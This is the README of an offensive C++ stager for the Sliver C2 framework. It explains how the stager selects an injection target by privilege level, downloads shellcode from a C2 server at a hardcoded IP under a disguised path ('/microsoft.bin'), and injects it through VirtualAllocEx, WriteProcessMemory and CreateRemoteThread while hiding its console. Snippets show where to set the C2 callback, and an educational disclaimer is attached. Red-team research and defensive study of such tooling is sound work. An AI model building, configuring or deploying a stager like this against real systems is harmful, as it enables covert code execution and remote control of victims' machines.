# Smart C++ Stager for Sliver C2
A custom, context-aware C++ Stager designed for Red Teaming operations. This tool dynamically identifies stable target processes based on current privileges, downloads shellcode from a C2 server (Sliver), and performs process injection without crashing the host system.

## ⚠️ DISCLAIMER

This project is created for educational purposes and ethical security research only. The techniques demonstrated here should only be used in controlled environments or systems you are explicitly authorized to test. The author is not responsible for any misuse of this software.

## 📖 Overview
Unlike basic stagers that rely on hardcoded PIDs or specific process names (like notepad.exe), this Stager implements a "Smart Targeting" system. It scans the environment to determine if it is running with User or Admin privileges and selects the most stable target available, avoiding critical system processes that could cause system instability (BSOD).

Key Features
🕵️ Context-Aware Targeting: automatically detects if running as User or Admin/System and adjusts the scanning logic.

🛡️ System Stability Guard: Implements a "Blacklist" to ignore critical processes (e.g., csrss.exe, smss.exe, lsass.exe) to prevent system crashes during injection.

🌐 Robust Networking: Uses WinInet API for HTTP/S requests with flags to bypass the Windows Cache, ensuring the payload is always fresh.

💉 Memory Injection: Uses VirtualAllocEx (RWX) -> WriteProcessMemory -> CreateRemoteThread. Supports self-modifying encoders (like shikata_ga_nai).

👻 Stealth Mode: Console window hiding capabilities for operation.

⚙️ How It Works
Reconnaissance: The stager takes a snapshot of running processes (CreateToolhelp32Snapshot).

Filtering: It iterates through the list, discarding unstable system processes and processes it cannot access.

Selection: It attempts to open a handle with PROCESS_VM_WRITE. The first valid process found is selected as the target.

Example: If running as SYSTEM, it might pick explorer.exe or amazon-ssm-agent.exe.

Example: If running as User, it might pick msedge.exe or onedrive.exe.

Retrieval: It connects to the defined C2 IP/Domain and downloads the shellcode into a memory buffer.

Execution: The shellcode is injected into the target process memory and executed via a new remote thread.

## 🚀 Getting Started
Prerequisites
Visual Studio (with "Desktop development with C++" workload).

Sliver C2 (or another C2 framework to generate shellcode).

Target machine running Windows 10/11 or Server (x64).

Configuration
Before compiling, open Stager.cpp and update the C2 configuration in the DownloadShellcode function call:


// Change IP and Port to your C2 Server

if (!DownloadShellcode(L"10.200.13.204", 80, &shellcode)) {
    // ...
}

Also, ensure the path in HttpOpenRequest matches your payload name:


HINTERNET request = HttpOpenRequest(connection, L"GET", L"/microsoft.bin", ...);

## ⚙️ Compilation
Open the solution in Visual Studio.

Set the build configuration to Release.

Crucial: Set the architecture to x64.

Note: This stager is designed for x64 targets. Injecting x64 shellcode into x86 processes (or vice versa) will crash the target.

Build the solution (Ctrl + Shift + B).

## 📚 References & Credits
This project was built for educational purposes and inspired by the work of amazing researchers in the community:

Dominic Breuker: For his extensive research on Stagers & Process Injection.

Tyler Ramsbey: For the practical insights in the "Sliver C2: Pentesting and Evasion" course.

## 📝 License
This project is open-source. Feel free to modify and use it for your own Red Team engagements or research.